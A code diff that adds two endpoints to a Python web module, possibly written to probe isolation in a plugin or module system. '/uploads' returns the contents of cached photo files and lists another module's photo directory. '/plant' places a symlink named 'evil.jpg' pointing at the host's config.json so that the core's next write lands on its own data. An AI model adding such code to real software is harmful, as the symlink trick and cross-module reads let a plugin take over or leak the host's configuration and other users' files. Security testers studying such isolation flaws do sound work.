@@ -47,6 +47,18 @@ class Module:
         self.config = config
         self.router = APIRouter()
         data, other = config["data_dir"], config["data_dir"].rsplit("/", 1)[0] + "/" + config.get("other", "x")
+        photos = config["cache_dir"] + "/files/photos"  # what the core put there (features/modules/files.py)
+        others_photos = config["cache_dir"].rsplit("/", 1)[0] + "/" + config.get("other", "x") + "/files/photos"
+
+        @self.router.get("/uploads")
+        async def uploads():
+            return {"own": attempt(lambda: sorted([name, open(f"{photos}/{name}").read()] for name in os.listdir(photos)
+                                                  if not os.path.islink(f"{photos}/{name}"))),
+                    "other": attempt(lambda: os.listdir(others_photos))}
+
+        @self.router.get("/plant")
+        async def plant():  # a link where the core will write next, to the core's data
+            return attempt(lambda: (os.symlink("/storage/mirrordash/data/config.json", photos + "/evil.jpg"), "PLANTED")[1])
 
         @self.router.get("/who")
         async def who():
